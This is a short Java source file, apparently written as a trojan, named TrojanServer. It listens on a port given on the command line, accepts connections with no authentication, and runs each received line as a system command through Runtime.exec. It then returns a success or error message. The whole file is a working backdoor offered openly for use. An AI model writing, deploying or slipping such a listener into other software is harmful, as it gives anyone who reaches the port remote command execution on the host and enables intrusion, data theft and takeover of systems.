import java.net.*;
import java.io.*;

public class TrojanServer 
{
    	public static void main(String[] args) throws IOException 
	{
	if (!(args.length >= 1))
	{
		System.out.println("TrojanServer created by Saurabh Badhwar");
		System.out.println("Usage: java TrojanServer <port>");
		System.exit(0);
	}
	String port;
	port = args[0];
	TrojanServer b = new TrojanServer(port);

	} 

        ServerSocket ssock = null;
        Socket sock = null;
	int count = 0;

	public TrojanServer(String port)
	{
        try 
	{
        	ssock = new ServerSocket(Integer.parseInt(port));
        }   
	catch (Exception e) 
	{

        	System.err.println("ERROR:Could not listen on port: " + port);
        	System.exit(1);
        }

	System.out.println("Waiting for a remote command from client....");
	
	try {
		while(true)
		{
        	    	sock = ssock.accept();
		    	System.out.println("Connection established. " + ++count);
		    	process();
		
	
		}
		/* ssock.close(); Do not close the server */

	}
	catch (Exception e)
	{
		System.out.println("Problem making a connection with the client!");
		System.out.println(e.toString());
	}
   }


   public void process()
   {

   try {

   //create PRINTWRITER and link it to SOCKET
   PrintWriter out = new PrintWriter(sock.getOutputStream(),true);

   //create BUFFEREDREADER and link it to SOCKET
   BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
   String fromClient=null;
   String toClient=null;

   
    fromClient = in.readLine();  
    System.out.println("Received from client: " + fromClient);
    toClient = "Executed command on server successfully!"; 
    String command = fromClient;

    try {	
    	Process p = Runtime.getRuntime().exec(command);		
    }
    catch (Exception e) 
	{
		System.out.println("Cannot execute command: " + command);
		toClient = ("Error(s) encountered in executing " + command);
   	 }
   
  	 out.println(toClient); //send it back to client
  	 out.close();
   	in.close();
   	sock.close();

   	}
   	catch (Exception e)
  	 {
       		System.out.println("Sorry! an error occured.");
      	 	System.out.println(e.toString());
  	 }

   }
}

